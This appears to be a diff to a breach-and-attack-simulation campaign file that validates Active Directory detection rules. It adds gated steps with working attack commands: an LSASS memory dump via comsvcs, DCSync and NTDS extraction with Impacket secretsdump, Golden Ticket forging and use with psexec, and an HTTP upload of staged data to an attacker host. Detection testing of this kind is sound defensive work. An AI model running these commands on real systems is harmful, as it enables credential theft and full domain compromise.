@@ -1,8 +1,35 @@
 campaign_id: SB-AD
 campaign_name: Spacebar AD Detection Validation
-description: Validates the current SB-AD Kibana detection rules. Includes Gahyun's existing 2-6 rules and Junseo's confirmed 10-13, 15, 16, and 19 rules. Excludes missing, paused, and not-yet-implemented techniques.
+description: Validates the SB-03 AWS AD intrusion scenario end to end. The flow keeps all 23 documented techniques visible in the BAS dashboard, routes each step to the proper SB-AD agent role, and blocks credential/domain-compromise actions unless explicit safety gates are set.
 
 flow:
+  - order: 1
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "01. User Execution: Malicious File"
+    technique_id: T1204.002
+    requires: [windows, powershell, sysmon]
+    params:
+      behavior: user_execution_malicious_file
+      technique_id: T1204.002
+      scenario_order: 1
+      execution_host: PC01
+      risk: high
+      description: Runs a harmless copied Windows binary named SecurityUpdate.exe to generate the same process-creation telemetry as the initial user-execution step without deploying malware.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: run-benign-securityupdate-placeholder
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: powershell
+          timeout: 40
+          command: >-
+            New-Item -ItemType Directory -Path "{{ pc01_drop_dir }}" -Force | Out-Null;
+            Copy-Item "C:\Windows\System32\cmd.exe" "{{ pc01_drop_dir }}\SecurityUpdate.exe" -Force;
+            & "{{ pc01_drop_dir }}\SecurityUpdate.exe" /c whoami
+
   - order: 2
     phase: attack
     module: attack.sb_ad_technique
@@ -16,7 +43,7 @@ flow:
       scenario_order: 2
       execution_host: PC01
       risk: high
-      description: Launches cmd.exe from the BAS agent context to match the existing command-shell detection.
+      description: Launches cmd.exe from the BAS agent context to match the command-shell detection.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: cmd-whoami
@@ -40,7 +67,7 @@ flow:
       scenario_order: 3
       execution_host: PC01
       risk: high
-      description: Opens a non-web outbound TCP connection from PC01 to the attacker host.
+      description: Opens a non-web TCP connection from PC01 to the attacker host to validate Sysmon Event ID 3 based C2-channel detection.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
         - name: outbound-non-web-port-check
@@ -50,7 +77,7 @@ flow:
           shell: powershell
           timeout: 30
           command: >-
-            Test-NetConnection {{ attacker_public_ip }} -Port {{ suspicious_ssh_port }} | Out-String
+            Test-NetConnection {{ attacker_private_ip }} -Port {{ suspicious_ssh_port }} | Out-String
 
   - order: 4
     phase: attack
@@ -65,16 +92,16 @@ flow:
       scenario_order: 4
       execution_host: PC01
       risk: low
-      description: Enumerates domain groups with net.exe to match the existing account-discovery rule.
+      description: Enumerates domain users and groups with net.exe to match account-discovery detections.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
-        - name: net-group-domain
+        - name: net-user-domain
           executor: local
           agent_role: pc01
           platform: windows
           shell: cmd
           timeout: 30
-          command: net group /domain
+          command: net user /domain
 
   - order: 5
     phase: attack
@@ -124,6 +151,78 @@ flow:
           timeout: 20
           command: whoami
 
+  - order: 7
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "07. Network Share Discovery"
+    technique_id: T1135
+    requires: [windows, cmd, sysmon, active_directory]
+    params:
+      behavior: network_share_discovery
+      technique_id: T1135
+      scenario_order: 7
+      execution_host: PC01
+      risk: low
+      description: Enumerates FS01 SMB shares and the shared folder path.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: net-view-fs01-share
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: cmd
+          timeout: 30
+          command: net view \\FS01 && dir \\FS01\share
+
+  - order: 8
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "08. Permission Groups Discovery"
+    technique_id: T1069
+    requires: [windows, cmd, sysmon, active_directory]
+    params:
+      behavior: permission_groups_discovery
+      technique_id: T1069
+      scenario_order: 8
+      execution_host: PC01
+      risk: low
+      description: Checks local and domain administrator group membership with built-in Windows commands.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: admin-group-discovery
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: cmd
+          timeout: 30
+          command: net localgroup Administrators && net group "Domain Admins" /domain
+
+  - order: 9
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "09. Kerberoasting TGS Request"
+    technique_id: T1558.003
+    requires: [windows, cmd, kerberos, windows_security]
+    params:
+      behavior: kerberoasting_tgs_request
+      technique_id: T1558.003
+      scenario_order: 9
+      execution_host: PC01
+      risk: medium
+      description: Requests the cifs/FS01 service ticket with native klist to generate Kerberos 4769 telemetry without extracting or cracking hashes.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: request-cifs-service-ticket
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: cmd
+          timeout: 30
+          command: klist get cifs/FS01.mycompany.local
+
   - order: 10
     phase: attack
     module: attack.sb_ad_technique
@@ -131,6 +230,7 @@ flow:
     name: "10. WinRM Remote Execution"
     technique_id: T1021.006
     requires: [windows, powershell, winrm, sysmon, windows_security]
+    depends_on_orders: [9]
     params:
       behavior: winrm_remote_execution
       technique_id: T1021.006
@@ -193,10 +293,10 @@ flow:
       scenario_order: 12
       execution_host: FS01
       risk: medium
-      description: Downloads a tool from the attacker web server to FS01.
+      description: Downloads a benign BAS probe file from the attacker web server to FS01 so PowerShell 4104 download telemetry can be validated without moving a real offensive tool by default.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION]
       commands:
-        - name: download-rubeus-to-fs01
+        - name: download-benign-probe-to-fs01
           executor: local
           agent_role: pc01
           platform: windows
@@ -206,7 +306,7 @@ flow:
             $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
             $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
             Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_http_port }}/Rubeus.exe" -OutFile "{{ tool_drop_path }}" -UseBasicParsing
+              Invoke-WebRequest -Uri "http://{{ attacker_private_ip }}:{{ attacker_http_port }}/{{ benign_download_name }}" -OutFile "{{ fs01_temp_dir }}\{{ benign_download_name }}" -UseBasicParsing
             }
 
   - order: 13
@@ -223,7 +323,7 @@ flow:
       scenario_order: 13
       execution_host: FS01
       risk: critical
-      description: Creates an LSASS minidump on FS01 using rundll32 and comsvcs.dll.
+      description: Creates an LSASS minidump on FS01 using rundll32 and comsvcs.dll. This is blocked unless credential-test gates are explicitly enabled.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_CREDENTIAL_TESTS]
       commands:
         - name: dump-lsass-fs01
@@ -235,6 +335,33 @@ flow:
           command: >-
             $pid = (Get-Process lsass).Id;
             rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid "{{ fs01_temp_dir }}\lsass.dmp" full
+
+  - order: 14
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "14. Rundll32 Proxy Execution"
+    technique_id: T1218.011
+    requires: [windows, powershell, sysmon]
+    depends_on_orders: [10]
+    params:
+      behavior: rundll32_comsvcs_proxy
+      technique_id: T1218.011
+      scenario_order: 14
+      execution_host: FS01
+      risk: critical
+      description: Validates the rundll32/comsvcs MiniDump proxy-execution evidence used by the LSASS dump chain. Kept as a separate gated step so the dashboard can score the T1218.011 coverage explicitly.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_CREDENTIAL_TESTS]
+      commands:
+        - name: rundll32-comsvcs-minidump-fs01
+          executor: local
+          agent_role: fs01
+          platform: windows
+          shell: powershell
+          timeout: 60
+          command: >-
+            $pid = (Get-Process lsass).Id;
+            rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid "{{ fs01_temp_dir }}\bas_t1218_lsass.dmp" full
 
   - order: 15
     phase: attack
@@ -263,7 +390,7 @@ flow:
             $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
             $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
             Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
-              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force;
+              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
               "BAS synthetic credential artifact only" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
               "BAS synthetic customer rows only" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
             }
@@ -298,6 +425,68 @@ flow:
               Invoke-WebRequest -Uri "http://{{ attacker_public_ip }}:{{ attacker_upload_port }}/upload" -Method POST -InFile "{{ fs01_public_share }}\{{ staged_customer_name }}" -UseBasicParsing
             }
 
+  - order: 17
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "17. Masquerading Legitimate Name"
+    technique_id: T1036.005
+    requires: [windows, powershell, winrm, sysmon]
+    depends_on_orders: [15]
+    params:
+      behavior: masquerading_legitimate_name
+      technique_id: T1036.005
+      scenario_order: 17
+      execution_host: FS01
+      risk: medium
+      description: Creates synthetic files with log/backup-like names to validate masquerading filename detections without touching real business data.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: create-masqueraded-synthetic-files
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: powershell
+          timeout: 45
+          command: >-
+            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
+            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
+            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
+              New-Item -ItemType Directory -Path "{{ fs01_public_share }}" -Force | Out-Null;
+              "BAS masquerade probe" | Out-File "{{ fs01_public_share }}\{{ staged_lsass_name }}" -Encoding ascii;
+              "BAS backup probe" | Out-File "{{ fs01_public_share }}\{{ staged_customer_name }}" -Encoding ascii
+            }
+
+  - order: 18
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "18. Archive Collected Data"
+    technique_id: T1560.001
+    requires: [windows, powershell, winrm, powershell_logging]
+    depends_on_orders: [15]
+    params:
+      behavior: archive_collected_data
+      technique_id: T1560.001
+      scenario_order: 18
+      execution_host: FS01
+      risk: medium
+      description: Compresses the synthetic staged files into a zip archive to validate archive-before-exfiltration detection logic.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION]
+      commands:
+        - name: compress-staged-synthetic-files
+          executor: local
+          agent_role: pc01
+          platform: windows
+          shell: powershell
+          timeout: 45
+          command: >-
+            $sec = ConvertTo-SecureString $env:BAS_SVC_FILE_PASSWORD -AsPlainText -Force;
+            $cred = New-Object System.Management.Automation.PSCredential("{{ netbios_domain }}\{{ service_user }}", $sec);
+            Invoke-Command -ComputerName {{ fs01 }} -Credential $cred -ScriptBlock {
+              Compress-Archive -Path "{{ fs01_public_share }}\{{ staged_lsass_name }}","{{ fs01_public_share }}\{{ staged_customer_name }}" -DestinationPath "{{ fs01_public_share }}\{{ archive_name }}" -Force
+            }
+
   - order: 19
     phase: attack
     module: attack.sb_ad_technique
@@ -311,7 +500,7 @@ flow:
       scenario_order: 19
       execution_host: Attacker
       risk: critical
-      description: Uses Impacket secretsdump to request krbtgt replication data from DC01.
+      description: Uses Impacket secretsdump to request krbtgt replication data from DC01. This is blocked unless domain-compromise gates are explicitly enabled.
       safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS]
       commands:
         - name: secretsdump-dcsync-krbtgt
@@ -323,3 +512,111 @@ flow:
           command: >-
             cd {{ impacket_examples_dir }} &&
             python3 secretsdump.py -hashes :$BAS_DA_NTLM_HASH '{{ netbios_domain }}/{{ admin_user }}@{{ dc01_private_ip }}' -just-dc-user krbtgt
+
+  - order: 20
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "20. Golden Ticket"
+    technique_id: T1558.001
+    requires: [attacker_host, impacket, kerberos, windows_security]
+    depends_on_orders: [19]
+    params:
+      behavior: golden_ticket_service_ticket
+      technique_id: T1558.001
+      scenario_order: 20
+      execution_host: Attacker
+      risk: critical
+      description: Generates a Golden Ticket ccache with Impacket ticketer. Actual use of the ticket is gated and should only be performed during an approved domain-compromise validation window.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS, BAS_ENABLE_GOLDEN_TICKET_TESTS]
+      commands:
+        - name: ticketer-golden-ticket
+          executor: local
+          agent_role: attacker
+          platform: linux
+          shell: bash
+          timeout: 120
+          command: >-
+            cd {{ impacket_examples_dir }} &&
+            python3 ticketer.py -aesKey "$BAS_KRBTGT_AES256" -domain-sid "$BAS_DOMAIN_SID" -domain {{ domain }} {{ admin_user }}
+
+  - order: 21
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "21. Valid Domain Account Remote Logon"
+    technique_id: T1078.002
+    requires: [attacker_host, impacket, kerberos, windows_security]
+    depends_on_orders: [20]
+    params:
+      behavior: valid_domain_account_remote_logon
+      technique_id: T1078.002
+      scenario_order: 21
+      execution_host: Attacker_to_DC01
+      risk: critical
+      description: Uses the Golden Ticket ccache for a network logon attempt against DC01. This is a gated domain-compromise validation step.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS, BAS_ENABLE_GOLDEN_TICKET_TESTS]
+      commands:
+        - name: kerberos-smb-logon-dc01
+          executor: local
+          agent_role: attacker
+          platform: linux
+          shell: bash
+          timeout: 120
+          command: >-
+            cd {{ impacket_examples_dir }} &&
+            KRB5CCNAME={{ admin_user }}.ccache python3 smbclient.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -debug
+
+  - order: 22
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "22. Service Execution"
+    technique_id: T1569.002
+    requires: [attacker_host, impacket, kerberos, windows_security]
+    depends_on_orders: [20]
+    params:
+      behavior: service_execution
+      technique_id: T1569.002
+      scenario_order: 22
+      execution_host: Attacker_to_DC01
+      risk: critical
+      description: Uses Impacket psexec with a Golden Ticket to trigger service-installation telemetry on DC01. This is blocked unless explicit domain-compromise gates are set.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS, BAS_ENABLE_GOLDEN_TICKET_TESTS, BAS_ENABLE_SERVICE_EXECUTION_TESTS]
+      commands:
+        - name: psexec-golden-ticket-dc01
+          executor: local
+          agent_role: attacker
+          platform: linux
+          shell: bash
+          timeout: 180
+          command: >-
+            cd {{ impacket_examples_dir }} &&
+            KRB5CCNAME={{ admin_user }}.ccache python3 psexec.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }} -codec utf-8
+
+  - order: 23
+    phase: attack
+    module: attack.sb_ad_technique
+    target: SB-AD
+    name: "23. NTDS Dump"
+    technique_id: T1003.003
+    requires: [attacker_host, impacket, kerberos, windows_security]
+    depends_on_orders: [20]
+    params:
+      behavior: ntds_dump
+      technique_id: T1003.003
+      scenario_order: 23
+      execution_host: Attacker_to_DC01
+      risk: critical
+      description: Uses Impacket secretsdump with a Golden Ticket to dump AD credential material. This is the highest-risk step and is blocked unless the dedicated NTDS safety gate is set.
+      safety_gates: [BAS_ALLOW_REAL_EXECUTION, BAS_ENABLE_DOMAIN_COMPROMISE_TESTS, BAS_ENABLE_GOLDEN_TICKET_TESTS, BAS_ENABLE_NTDS_DUMP_TESTS]
+      commands:
+        - name: secretsdump-ntds-golden-ticket
+          executor: local
+          agent_role: attacker
+          platform: linux
+          shell: bash
+          timeout: 240
+          command: >-
+            cd {{ impacket_examples_dir }} &&
+            KRB5CCNAME={{ admin_user }}.ccache python3 secretsdump.py '{{ domain }}/{{ admin_user }}@{{ dc01 }}' -k -no-pass -target-ip {{ dc01_private_ip }}
